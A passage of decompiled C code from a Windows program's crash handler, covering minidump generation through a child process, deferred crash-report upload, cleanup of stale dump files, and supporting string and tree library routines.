  FUN_00407adc(&piStack92,(HMODULE)&DAT_0042fea8);
  FUN_00411779(&local_64,&piStack92);
  _Stack36.lpSecurityDescriptor = (LPVOID)0x0;
  _Stack36.nLength = 0xc;
  _Stack36.bInheritHandle = 1;
  pvVar2 = CreateFileW((LPCWSTR)piStack92,0x40000000,0,&_Stack36,2,0x80,(HANDLE)0x0);
  if (pvVar2 == (HANDLE)0xffffffff) {
    DVar3 = FUN_00407e13();
    pvVar2 = (HANDLE)0x0;
  }
  FUN_00401df0((int **)(piStack92 + -4));
  if (((int)DVar3 < 0) &&
     (ppiVar5 = (int **)(-(uint)(DAT_00437b68 != '\0') & 0x437e20), ppiVar5 != (int **)0x0)) {
    ppiStack80 = ppiVar5;
    uStack76 = FUN_00405bda(ppiVar5,ppiVar5,-2);
    uStack72 = 0xfffffffe;
    uStack68 = 8;
    FUN_00401e16(&ppiStack80,L"[OpenCustomInfoFile failed][0x%08x]");
  }
  local_54 = (int **)FUN_0040a474(param_2,pvStack88,hObject,pvVar2);
  pcVar10 = CloseHandle_exref;
  if (pvStack88 != (HANDLE)0x0) {
    CloseHandle(pvStack88);
    pvStack88 = (HANDLE)0x0;
  }
  if (pvVar2 != (HANDLE)0x0) {
    CloseHandle(pvVar2);
    pvVar2 = (HANDLE)0x0;
  }
  if (hObject != (HANDLE)0x0) {
    CloseHandle(hObject);
    hObject = (HANDLE)0x0;
  }
  if (local_54 == (int **)0x1) {
    ppiVar5 = (int **)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (ppiVar5 != (int **)0x0) {
      ppiStack80 = ppiVar5;
      uStack76 = FUN_00405bda(ppiVar5,ppiVar5,-2);
      uStack72 = 0xfffffffe;
      uStack68 = 8;
      FUN_00401e16(&ppiStack80,L"[CrashHandler minidump generation failed]");
    }
    goto LAB_0040a430;
  }
  FUN_00408871((int *)apiStack56);
  ppiStack80 = *(int ***)(param_2 + 0x1c);
  uStack76 = *(int *)(param_2 + 0x18) + 1;
  iVar4 = FUN_00411a25((int *)&ppiStack80,apiStack56);
  if (iVar4 < 0) {
    ppuVar6 = &PTR_PTR_FUN_00436598;
LAB_0040a328:
    FUN_004095ae((int)ppuVar6);
  }
  else {
    uVar9 = FUN_00411b3d(apiStack56);
    if ((char)uVar9 != '\0') {
      piStack92 = *(int **)(param_2 + 0x40);
      local_54 = FUN_00401aca((int **)(local_64 + -4));
      local_54 = local_54 + 4;
      this = (int **)((int)param_1 + 0x1c);
      ppiVar5 = (int **)*this;
      ppiVar7 = (int **)(*this)[1];
      while (*(char *)((int)ppiVar7 + 0xd) == '\0') {
        if (ppiVar7[4] < piStack92) {
          ppiVar7 = (int **)ppiVar7[2];
        }
        else {
          ppiVar5 = ppiVar7;
          ppiVar7 = (int **)*ppiVar7;
        }
      }
      if ((ppiVar5 == (int **)*this) || (ppiStack80 = this, piStack92 < ppiVar5[4])) {
        ppiStack80 = &piStack92;
        ppiVar5 = FUN_0040b437(this,&local_40,ppiVar5,this,&ppiStack80);
        ppiVar5 = (int **)*ppiVar5;
      }
      FUN_00401b2a(ppiVar5 + 5,(int *)&local_54);
      FUN_00401df0(local_54 + -4);
      ppiVar5 = (int **)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
      if (ppiVar5 != (int **)0x0) {
        ppiStack80 = ppiVar5;
        uStack76 = FUN_00405bda(ppiVar5,ppiVar5,-2);
        uStack72 = 0xfffffffe;
        uStack68 = 8;
        FUN_00401e16(&ppiStack80,L"[CrashHandler][Upload deferred][Crash ID %d]");
        pcVar10 = CloseHandle_exref;
      }
      ppuVar6 = &PTR_PTR_FUN_00436558;
      goto LAB_0040a328;
    }
    piVar1 = (int *)FUN_0040139e();
    CSimpleStringT__(&piStack92,piVar1);
    FUN_00411779(&local_64,&piStack92);
    ppiStack80 = (int **)FUN_00409ec7(param_1,(int *)&local_64,(int *)&piStack92);
    if (((int)ppiStack80 < 0) &&
       (pvVar8 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20), pvVar8 != (void *)0x0)) {
      pvStack24 = pvVar8;
      uStack20 = FUN_00405bda(pvVar8,pvVar8,-2);
      uStack16 = 0xfffffffe;
      uStack12 = 8;
      FUN_00401e16(&pvStack24,L"[StartCrashUploader() failed][0x%08x]");
    }
    FUN_00401df0((int **)(piStack92 + -4));
    if ((char)local_40 != '\0') {
      DeleteFileW(local_60);
    }
    pvVar8 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (pvVar8 != (void *)0x0) {
      pvStack24 = pvVar8;
      uStack20 = FUN_00405bda(pvVar8,pvVar8,1);
      uStack16 = 1;
      uStack12 = 8;
      FUN_00401e16(&pvStack24,L"[CrashHandler][Dump handled][%d-bit][is_system %d]");
    }
  }
  FUN_00408850((int *)apiStack56);
  FID_conflict__free(apiStack56[0]);
LAB_0040a430:
  if (pvVar2 != (HANDLE)0x0) {
    (*pcVar10)(pvVar2);
  }
  if (hObject != (HANDLE)0x0) {
    (*pcVar10)(hObject);
  }
  if (pvStack88 != (HANDLE)0x0) {
    (*pcVar10)(pvStack88);
  }
  FUN_00401df0((int **)(local_60 + -8));
  FUN_00401df0((int **)(local_64 + -4));
  FUN_00401df0((int **)(local_3c + -0x10));
  return;
}



undefined4 FUN_0040a474(DWORD param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  HANDLE hObject;
  DWORD DVar1;
  void *this;
  undefined4 uVar2;
  void *local_38;
  uint local_34;
  undefined4 local_30;
  undefined4 local_2c;
  _PROCESS_INFORMATION local_28;
  _SECURITY_ATTRIBUTES local_18;
  HANDLE local_c;
  HANDLE local_8;
  
  local_18.nLength = 0xc;
  uVar2 = 1;
  local_18.lpSecurityDescriptor = (LPVOID)0x0;
  local_18.bInheritHandle = 1;
  hObject = CreateEventW(&local_18,1,0,(LPCWSTR)0x0);
  local_28.hProcess = (HANDLE)0x0;
  local_28.hThread = (HANDLE)0x0;
  local_28.dwProcessId = 0;
  local_28.dwThreadId = 0;
  DVar1 = FUN_00409bfb((uint)hObject,param_2,param_3,param_4,param_1,&local_28);
  if (-1 < (int)DVar1) {
    local_8 = local_28.hProcess;
    local_c = hObject;
    DVar1 = WaitForMultipleObjects(2,&local_c,0,300000);
    if (DVar1 == 0) {
      this = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
      if (this != (void *)0x0) {
        local_38 = this;
        local_34 = FUN_00405bda(this,this,1);
        local_30 = 1;
        local_2c = 8;
        FUN_00401e16(&local_38,L"[Child process signals that minidump is created.]");
      }
      uVar2 = 0;
    }
    else if (DVar1 == 1) {
      param_1 = 0;
      GetExitCodeProcess(local_28.hProcess,&param_1);
    }
  }
  if (hObject != (HANDLE)0x0) {
    CloseHandle(hObject);
  }
  return uVar2;
}



// WARNING: Removing unreachable block (ram,0x0040a5ce)

void __fastcall FUN_0040a54e(int param_1)

{
  int **this;
  HMODULE lpFileName;
  ulonglong uVar1;
  int **ppiVar2;
  int **ppiVar3;
  DWORD DVar4;
  int *piVar5;
  undefined4 extraout_ECX;
  void *this_00;
  longlong lVar6;
  void *local_34;
  uint local_30;
  undefined4 local_2c;
  undefined4 local_28;
  _FILETIME local_24;
  int *local_1c;
  int *local_18;
  HMODULE local_14;
  undefined4 local_10;
  int **local_c;
  LPCWSTR local_8;
  
  this = (int **)(param_1 + 0x1c);
  local_c = (int **)**this;
  if (local_c != (int **)*this) {
    do {
      ppiVar2 = local_c;
      ppiVar3 = FUN_00401aca((int **)(local_c[5] + -4));
      lpFileName = (HMODULE)(ppiVar3 + 4);
      local_24.dwLowDateTime = 0;
      local_24.dwHighDateTime = 0;
      local_14 = lpFileName;
      DVar4 = FUN_00407f25((LPCWSTR)lpFileName,&local_24,extraout_ECX,(LPFILETIME)0x0);
      if ((int)DVar4 < 0) {
        FUN_00402ad4((int **)&local_c);
        FUN_0040a9bd(this,&local_18,ppiVar2);
      }
      else {
        lVar6 = FUN_00407c01();
        uVar1 = lVar6 - CONCAT44(local_24.dwHighDateTime,local_24.dwLowDateTime);
        local_10 = (undefined4)uVar1;
        if (uVar1 < 864000000000) {
          FUN_00402ad4((int **)&local_c);
        }
        else {
          piVar5 = (int *)FUN_0040139e();
          CSimpleStringT__(&local_8,piVar5);
          FUN_00411779(&local_14,&local_8);
          DeleteFileW(local_8);
          DeleteFileW((LPCWSTR)lpFileName);
          FUN_00402ad4((int **)&local_c);
          FUN_0040a9bd(this,&local_1c,ppiVar2);
          this_00 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
          if (this_00 != (void *)0x0) {
            local_34 = this_00;
            local_30 = FUN_00405bda(this_00,this_00,1);
            local_2c = 1;
            local_28 = 8;
            FUN_00401e16(&local_34,
                         L"[CrashHandler][Deleted Stale Crash][filename %s][custom data %s]");
          }
          FUN_00401df0((int **)(local_8 + -8));
        }
      }
      FUN_00401df0(ppiVar3);
    } while (local_c != (int **)*this);
  }
  return;
}



void __cdecl FUN_0040a689(undefined4 *param_1,uint param_2)

{
  undefined4 *puVar1;
  undefined4 *this;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int **ppiVar4;
  int *piVar5;
  DWORD DVar6;
  void *this_00;
  void *local_18;
  uint local_14;
  undefined4 local_10;
  undefined4 local_c;
  HMODULE local_8;
  
  this = param_1;
  puVar1 = (undefined4 *)param_1[7];
  puVar2 = (undefined4 *)puVar1[1];
  param_1 = puVar1;
  while (puVar3 = puVar2, *(char *)((int)puVar3 + 0xd) == '\0') {
    if ((uint)puVar3[4] < param_2) {
      puVar2 = (undefined4 *)puVar3[2];
    }
    else {
      puVar2 = (undefined4 *)*puVar3;
      param_1 = puVar3;
    }
  }
  if ((param_1 == puVar1) || (param_2 < (uint)param_1[4])) {
    param_1 = puVar1;
  }
  if (param_1 != puVar1) {
    ppiVar4 = FUN_00401aca((int **)(param_1[5] + -0x10));
    local_8 = (HMODULE)(ppiVar4 + 4);
    piVar5 = (int *)FUN_0040139e();
    CSimpleStringT__(&param_1,piVar5);
    FUN_00411779(&local_8,&param_1);
    DVar6 = FUN_00409ec7(this,(int *)&local_8,(int *)&param_1);
    if (((int)DVar6 < 0) &&
       (this_00 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20), this_00 != (void *)0x0)) {
      local_18 = this_00;
      local_14 = FUN_00405bda(this_00,this_00,-2);
      local_10 = 0xfffffffe;
      local_c = 8;
      FUN_00401e16(&local_18,L"[StartCrashUploader() failed][0x%08x]");
    }
    FUN_00401df0((int **)(param_1 + -4));
    FUN_00401df0(ppiVar4);
  }
  return;
}



DWORD FUN_0040a76a(void)

{
  HANDLE hProcess;
  BOOL BVar1;
  DWORD DVar2;
  void *this;
  int iVar3;
  UINT *pUVar4;
  SIZE_T dwMinimumWorkingSetSize;
  SIZE_T dwMaximumWorkingSetSize;
  MSG local_30;
  void *local_14;
  uint local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  this = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
  if (this != (void *)0x0) {
    local_14 = this;
    local_10 = FUN_00405bda(this,this,1);
    local_c = 1;
    local_8 = 8;
    FUN_00401e16(&local_14,L"[CrashHandler::RunUntilShutdown]");
  }
  dwMaximumWorkingSetSize = 0xffffffff;
  dwMinimumWorkingSetSize = 0xffffffff;
  hProcess = GetCurrentProcess();
  BVar1 = SetProcessWorkingSetSize(hProcess,dwMinimumWorkingSetSize,dwMaximumWorkingSetSize);
  if (BVar1 == 0) {
    FUN_00407e13();
  }
  local_30.hwnd = (HWND)0x0;
  pUVar4 = &local_30.message;
  for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
    *pUVar4 = 0;
    pUVar4 = pUVar4 + 1;
  }
  do {
    BVar1 = GetMessageW(&local_30,(HWND)0x0,0,0);
    if (BVar1 == 0) {
      return 0;
    }
    DispatchMessageW(&local_30);
  } while (BVar1 != -1);
  DVar2 = FUN_00407e13();
  return DVar2;
}



undefined4 __fastcall FUN_0040a810(int param_1)

{
  BOOL BVar1;
  HANDLE hProcess;
  void *this;
  UINT uExitCode;
  void *local_14;
  uint local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  this = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
  if (this != (void *)0x0) {
    local_14 = this;
    local_10 = FUN_00405bda(this,this,1);
    local_c = 1;
    local_8 = 8;
    FUN_00401e16(&local_14,L"[CrashHandler::Shutdown]");
  }
  BVar1 = PostThreadMessageW(*(DWORD *)(param_1 + 0x10),0x12,0,0);
  if (BVar1 == 0) {
    uExitCode = 0x80004004;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  return 0;
}



undefined8 __thiscall FUN_0040a884(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int **ppiVar3;
  undefined8 uVar4;
  wchar_t *pwVar5;
  int local_40;
  int local_3c;
  int local_38;
  undefined2 local_34 [12];
  undefined local_1c [8];
  undefined4 uStack20;
  undefined4 uStack16;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_1c._0_4_ = 0;
  local_1c._4_4_ = 0;
  uStack20 = 0;
  uStack16 = 0;
  UuidCreate((UUID *)local_1c);
  uVar4 = FUN_004103fd(local_34,(int)local_1c);
  puVar1 = (undefined4 *)uVar4;
  if (7 < (uint)puVar1[5]) {
    puVar1 = (undefined4 *)*puVar1;
  }
  pwVar5 = L".dmp";
  piVar2 = (int *)FUN_00404f5b(&local_38,(int *)((int)this + 8),(int)&DAT_0042f0d4);
  piVar2 = (int *)FUN_00404f5b(&local_3c,piVar2,(int)puVar1);
  piVar2 = (int *)FUN_00404f5b(&local_40,piVar2,(int)pwVar5);
  ppiVar3 = FUN_00401aca((int **)(*piVar2 + -0x10));
  *param_1 = ppiVar3 + 4;
  FUN_00401df0((int **)(local_40 + -0x10));
  FUN_00401df0((int **)(local_3c + -0x10));
  FUN_00401df0((int **)(local_38 + -0x10));
  FUN_0040ae40(local_34,'\x01',(void *)0x0);
  uVar4 = FUN_0041a954();
  return uVar4;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall std::basic_string<unsigned short,struct std::char_traits<unsigned
// short>,class std::allocator<unsigned short>>::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>(unsigned short const *)
//  public: __thiscall std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>(wchar_t const *)
// 
// Library: Visual Studio 2012 Release

undefined2 * __fastcall basic_string__(undefined2 *param_1,undefined2 param_2,undefined4 *param_3)

{
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 10) = 7;
  *param_1 = 0;
  FID_conflict_assign(param_1,param_2,param_3);
  return param_1;
}



void __thiscall FUN_0040a968(void *this,LPCRITICAL_SECTION param_1)

{
  LPCRITICAL_SECTION _Memory;
  
                    // WARNING: Load size is inaccurate
  _Memory = *this;
  if (param_1 != _Memory) {
    if (_Memory != (LPCRITICAL_SECTION)0x0) {
      FUN_0040f774(_Memory);
      FID_conflict__free(_Memory);
    }
    *(LPCRITICAL_SECTION *)this = param_1;
  }
  return;
}



void __fastcall FUN_0040a994(void **param_1)

{
  FUN_0040b3f7(*(int **)((int)*param_1 + 4));
  *(void **)((int)*param_1 + 4) = *param_1;
  *(void **)*param_1 = *param_1;
  *(void **)((int)*param_1 + 8) = *param_1;
  param_1[1] = (void *)0x0;
  FID_conflict__free(*param_1);
  return;
}



void __thiscall FUN_0040a9bd(void *this,int **param_1,int **param_2)

{
  undefined uVar1;
  int *piVar2;
  int **_Memory;
  int **ppiVar3;
  int **ppiVar4;
  int **ppiVar5;
  int **ppiVar6;
  
  _Memory = param_2;
  FUN_00402ad4((int **)&param_2);
  ppiVar5 = (int **)*_Memory;
  if (*(char *)((int)ppiVar5 + 0xd) == '\0') {
    ppiVar6 = ppiVar5;
    if ((*(char *)((int)_Memory[2] + 0xd) != '\0') ||
       (ppiVar6 = (int **)param_2[2], param_2 == _Memory)) goto LAB_0040a9f7;
    ppiVar5[1] = (int *)param_2;
    *param_2 = *_Memory;
    ppiVar5 = param_2;
    if (param_2 != (int **)_Memory[2]) {
      ppiVar5 = (int **)param_2[1];
      if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
        ppiVar6[1] = (int *)ppiVar5;
      }
      *ppiVar5 = (int *)ppiVar6;
      param_2[2] = _Memory[2];
      _Memory[2][1] = (int)param_2;
    }
                    // WARNING: Load size is inaccurate
    if (*(int ***)(*this + 4) == _Memory) {
      *(int ***)(*this + 4) = param_2;
    }
    else {
      piVar2 = _Memory[1];
      if ((int **)*piVar2 == _Memory) {
        *piVar2 = (int)param_2;
      }
      else {
        piVar2[2] = (int)param_2;
      }
    }
    param_2[1] = _Memory[1];
    uVar1 = *(undefined *)(param_2 + 3);
    *(undefined *)(param_2 + 3) = *(undefined *)(_Memory + 3);
    *(undefined *)(_Memory + 3) = uVar1;
  }
  else {
    ppiVar6 = (int **)_Memory[2];
LAB_0040a9f7:
    ppiVar5 = (int **)_Memory[1];
    if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
      ppiVar6[1] = (int *)ppiVar5;
    }
                    // WARNING: Load size is inaccurate
    if (*(int ***)(*this + 4) == _Memory) {
      *(int ***)(*this + 4) = ppiVar6;
    }
    else if ((int **)*ppiVar5 == _Memory) {
      *ppiVar5 = (int *)ppiVar6;
    }
    else {
      ppiVar5[2] = (int *)ppiVar6;
    }
                    // WARNING: Load size is inaccurate
    if ((int **)**this == _Memory) {
      ppiVar3 = ppiVar5;
      if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
        ppiVar3 = ppiVar6;
        for (ppiVar4 = (int **)*ppiVar6; *(char *)((int)ppiVar4 + 0xd) == '\0';
            ppiVar4 = (int **)*ppiVar4) {
          ppiVar3 = ppiVar4;
        }
      }
                    // WARNING: Load size is inaccurate
      **this = (int *)ppiVar3;
    }
                    // WARNING: Load size is inaccurate
    if (*(int ***)(*this + 8) == _Memory) {
      ppiVar3 = ppiVar5;
      if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
        ppiVar3 = ppiVar6;
        for (ppiVar4 = (int **)ppiVar6[2]; *(char *)((int)ppiVar4 + 0xd) == '\0';
            ppiVar4 = (int **)ppiVar4[2]) {
          ppiVar3 = ppiVar4;
        }
      }
                    // WARNING: Load size is inaccurate
      *(int ***)(*this + 8) = ppiVar3;
    }
  }
  if (*(char *)(_Memory + 3) != '\x01') {
LAB_0040abdc:
    FUN_00401df0((int **)(_Memory[5] + -4));
    FID_conflict__free(_Memory);
    if (*(int *)((int)this + 4) != 0) {
      *(int *)((int)this + 4) = *(int *)((int)this + 4) + -1;
    }
    *param_1 = (int *)param_2;
    return;
  }
LAB_0040ab95:
  ppiVar3 = ppiVar5;
                    // WARNING: Load size is inaccurate
  if ((ppiVar6 == *(int ***)(*this + 4)) || (*(char *)(ppiVar6 + 3) != '\x01')) goto LAB_0040abd8;
  ppiVar5 = (int **)*ppiVar3;
  if (ppiVar6 == ppiVar5) {
    ppiVar5 = (int **)ppiVar3[2];
    if (*(char *)(ppiVar5 + 3) == '\0') {
      *(undefined *)(ppiVar5 + 3) = 1;
      *(undefined *)(ppiVar3 + 3) = 0;
      FUN_004088fa(this,(int *)ppiVar3);
      ppiVar5 = (int **)ppiVar3[2];
    }
    if (*(char *)((int)ppiVar5 + 0xd) == '\0') {
      if ((*(char *)(*ppiVar5 + 3) != '\x01') || (*(char *)(ppiVar5[2] + 3) != '\x01')) {
        if (*(char *)(ppiVar5[2] + 3) == '\x01') {
          *(undefined *)(*ppiVar5 + 3) = 1;
          *(undefined *)(ppiVar5 + 3) = 0;
          FUN_0040893e(this,(int *)ppiVar5);
          ppiVar5 = (int **)ppiVar3[2];
        }
        *(undefined *)(ppiVar5 + 3) = *(undefined *)(ppiVar3 + 3);
        *(undefined *)(ppiVar3 + 3) = 1;
        *(undefined *)(ppiVar5[2] + 3) = 1;
        FUN_004088fa(this,(int *)ppiVar3);
        goto LAB_0040abd8;
      }
LAB_0040ab8c:
      *(undefined *)(ppiVar5 + 3) = 0;
    }
  }
  else {
    if (*(char *)(ppiVar5 + 3) == '\0') {
      *(undefined *)(ppiVar5 + 3) = 1;
      *(undefined *)(ppiVar3 + 3) = 0;
      FUN_0040893e(this,(int *)ppiVar3);
      ppiVar5 = (int **)*ppiVar3;
    }
    if (*(char *)((int)ppiVar5 + 0xd) == '\0') {
      if ((*(char *)(ppiVar5[2] + 3) == '\x01') && (*(char *)(*ppiVar5 + 3) == '\x01'))
      goto LAB_0040ab8c;
      if (*(char *)(*ppiVar5 + 3) == '\x01') {
        *(undefined *)(ppiVar5[2] + 3) = 1;
        *(undefined *)(ppiVar5 + 3) = 0;
        FUN_004088fa(this,(int *)ppiVar5);
        ppiVar5 = (int **)*ppiVar3;
      }
      *(undefined *)(ppiVar5 + 3) = *(undefined *)(ppiVar3 + 3);
      *(undefined *)(ppiVar3 + 3) = 1;
      *(undefined *)(*ppiVar5 + 3) = 1;
      FUN_0040893e(this,(int *)ppiVar3);
LAB_0040abd8:
      *(undefined *)(ppiVar6 + 3) = 1;
      goto LAB_0040abdc;
    }
  }
  ppiVar5 = (int **)ppiVar3[1];
  ppiVar6 = ppiVar3;
  goto LAB_0040ab95;
}



int ** __fastcall FUN_0040ac0d(int **param_1,uint param_2,int **param_3)

{
  int iVar1;
  int **ppiVar2;
  int **ppiVar3;
  int *piVar4;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint uVar5;
  int **ppiVar6;
  int **local_8;
  
  ppiVar2 = param_3;
  local_8 = param_1;
  FUN_0040ae86((int *)param_1,param_2,(int *)&local_8,(int *)param_3);
  ppiVar6 = local_8;
  if (local_8 != (int **)*param_1) {
    iVar1 = FUN_00407c33(ppiVar2,extraout_EDX,(int)local_8[4]);
    if (-1 < iVar1) goto LAB_0040ac83;
  }
  ppiVar2 = (int **)FUN_00409221(param_1);
  *(undefined2 *)(ppiVar2 + 3) = 0;
  uVar5 = extraout_EDX_00;
  if (ppiVar2 != (int **)0xfffffff0) {
    ppiVar3 = FUN_00401aca((int **)(*param_3 + -4));
    ppiVar2[4] = (int *)(ppiVar3 + 4);
    piVar4 = (int *)FUN_0040139e();
    CSimpleStringT__(ppiVar2 + 5,piVar4);
    uVar5 = extraout_EDX_01;
  }
  FUN_0040b5d5(param_1,uVar5,(int **)&param_3,ppiVar6,(int *)(ppiVar2 + 4),ppiVar2);
  ppiVar6 = param_3;
LAB_0040ac83:
  return ppiVar6 + 5;
}



LPCRITICAL_SECTION __fastcall FUN_0040ac8f(LPCRITICAL_SECTION param_1)

{
  DeleteCriticalSection(param_1);
  if (param_1[1].DebugInfo != (PRTL_CRITICAL_SECTION_DEBUG)0x0) {
    FID_conflict__free(param_1[1].DebugInfo);
    param_1[1].DebugInfo = (PRTL_CRITICAL_SECTION_DEBUG)0x0;
    param_1[1].LockCount = 0;
    param_1[1].RecursionCount = 0;
  }
  FID_conflict__free(param_1);
  return param_1;
}



void * __fastcall FUN_0040acc0(void *param_1)

{
  void *pvVar1;
  
  if ((*(int *)((int)param_1 + 0xc) != 0) &&
     (pvVar1 = *(void **)((int)param_1 + 0xc), pvVar1 != (void *)0x0)) {
    FUN_004149c2((int)pvVar1);
    FID_conflict__free(pvVar1);
    *(undefined4 *)((int)param_1 + 0xc) = 0;
  }
  if (*(int *)((int)param_1 + 0x10) != 0) {
    FID_conflict__free(*(void **)((int)param_1 + 0x10));
    *(undefined4 *)((int)param_1 + 0x10) = 0;
    *(undefined4 *)((int)param_1 + 0x14) = 0;
    *(undefined4 *)((int)param_1 + 0x18) = 0;
  }
  pvVar1 = *(void **)((int)param_1 + 0xc);
  if (pvVar1 != (void *)0x0) {
    FUN_004149c2((int)pvVar1);
    FID_conflict__free(pvVar1);
  }
  FUN_00401df0((int **)(*(int *)((int)param_1 + 8) + -0x10));
  FUN_00401df0((int **)(*(int *)((int)param_1 + 4) + -0x10));
  FID_conflict__free(param_1);
  return param_1;
}



void * __fastcall FUN_0040ad35(void *param_1)

{
  FUN_0040f440((int)param_1);
  FUN_0040f45a(param_1,'\x01');
  if (*(int *)((int)param_1 + 0x24) != 0) {
    CloseHandle(*(HANDLE *)((int)param_1 + 0x24));
  }
  if (*(int *)((int)param_1 + 0x28) != 0) {
    CloseHandle(*(HANDLE *)((int)param_1 + 0x28));
  }
  if (*(int *)((int)param_1 + 0x2c) != 0) {
    CloseHandle(*(HANDLE *)((int)param_1 + 0x2c));
  }
  FID_conflict__free(*(void **)((int)param_1 + 0x1c));
  FID_conflict__free(param_1);
  return param_1;
}



void ** __fastcall
FUN_0040ad85(void **param_1,uint param_2,void **param_3,void *param_4,void *param_5)

{
  code *pcVar1;
  uint uVar2;
  void **ppvVar3;
  char *unaff_EDI;
  void *pvVar4;
  
  if (param_3[4] < param_4) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EDI);
    pcVar1 = (code *)swi(3);
    ppvVar3 = (void **)(*pcVar1)();
    return ppvVar3;
  }
  pvVar4 = (void *)((int)param_3[4] - (int)param_4);
  if (param_5 < pvVar4) {
    pvVar4 = param_5;
  }
  if (param_1 == param_3) {
    FUN_0040af3c(param_1,(int)param_4 + (int)pvVar4);
    FUN_0040af6f(param_1,0,(uint)param_4);
  }
  else {
    uVar2 = FUN_0040aff3(param_1,param_2,pvVar4,'\0');
    if ((char)uVar2 != '\0') {
      if ((void *)0x7 < param_3[5]) {
        param_3 = (void **)*param_3;
      }
      ppvVar3 = param_1;
      if (&DAT_00000008 <= param_1[5]) {
        ppvVar3 = (void **)*param_1;
      }
      copy(ppvVar3,(void *)((int)param_3 + (int)param_4 * 2),(int)pvVar4);
      param_1[4] = pvVar4;
      ppvVar3 = param_1;
      if (&DAT_00000008 <= param_1[5]) {
        ppvVar3 = (void **)*param_1;
      }
      *(undefined2 *)((int)ppvVar3 + (int)pvVar4 * 2) = 0;
    }
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class std::basic_string<unsigned short,struct std::char_traits<unsigned short>,class
// std::allocator<unsigned short>>& __thiscall std::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>::assign(unsigned short
// const *)
//  public: class std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>& __thiscall std::basic_string<wchar_t,struct
// std::char_traits<wchar_t>,class std::allocator<wchar_t>>::assign(wchar_t const *)
// 
// Library: Visual Studio 2012 Release

void __fastcall FID_conflict_assign(void *param_1,undefined2 param_2,undefined4 *param_3)

{
  void *pvVar1;
  
  pvVar1 = (void *)0x0;
  if (*(short *)param_3 != 0) {
    pvVar1 = (void *)FUN_0041c12a(param_1,param_2);
  }
  FID_conflict_assign(param_1,param_3,pvVar1);
  return;
}



void __thiscall FUN_0040ae40(void *this,char param_1,void *param_2)

{
  void *_Memory;
  
  if ((param_1 != '\0') && (7 < *(uint *)((int)this + 0x14))) {
                    // WARNING: Load size is inaccurate
    _Memory = *this;
    if (param_2 != (void *)0x0) {
      copy(this,_Memory,(int)param_2);
    }
    FID_conflict__free(_Memory);
  }
  *(void **)((int)this + 0x10) = param_2;
  *(undefined4 *)((int)this + 0x14) = 7;
  *(undefined2 *)((int)this + (int)param_2 * 2) = 0;
  return;
}



void __fastcall FUN_0040ae86(int *param_1,uint param_2,int *param_3,int *param_4)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  
  puVar4 = (undefined4 *)((undefined4 *)*param_1)[1];
  cVar1 = *(char *)((int)puVar4 + 0xd);
  puVar2 = (undefined4 *)*param_1;
  while (cVar1 == '\0') {
    uVar5 = FUN_00407c33(puVar4 + 4,param_2,*param_4);
    param_2 = (uint)((ulonglong)uVar5 >> 0x20);
    if ((int)uVar5 < 0) {
      puVar3 = (undefined4 *)puVar4[2];
      puVar4 = puVar2;
    }
    else {
      puVar3 = (undefined4 *)*puVar4;
    }
    puVar2 = puVar4;
    puVar4 = puVar3;
    cVar1 = *(char *)((int)puVar3 + 0xd);
  }
  *param_3 = (int)puVar2;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class std::basic_string<unsigned short,struct std::char_traits<unsigned short>,class
// std::allocator<unsigned short>>& __thiscall std::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>::assign(unsigned short
// const *,unsigned int)
//  public: class std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>& __thiscall std::basic_string<wchar_t,struct
// std::char_traits<wchar_t>,class std::allocator<wchar_t>>::assign(wchar_t const *,unsigned int)
// 
// Library: Visual Studio 2015 Release

void ** __thiscall FID_conflict_assign(void *this,undefined4 *param_1,void *param_2)

{
  uint uVar1;
  void *pvVar2;
  uint extraout_EDX;
  
  uVar1 = FID_conflict__Inside(this,param_1);
  if ((char)uVar1 == '\0') {
    uVar1 = FUN_0040aff3((void **)this,extraout_EDX,param_2,'\0');
    if ((char)uVar1 != '\0') {
      pvVar2 = this;
      if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        pvVar2 = *this;
      }
      copy(pvVar2,param_1,(int)param_2);
      *(void **)((int)this + 0x10) = param_2;
      pvVar2 = this;
      if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        pvVar2 = *this;
      }
      *(undefined2 *)((int)pvVar2 + (int)param_2 * 2) = 0;
    }
  }
  else {
    pvVar2 = this;
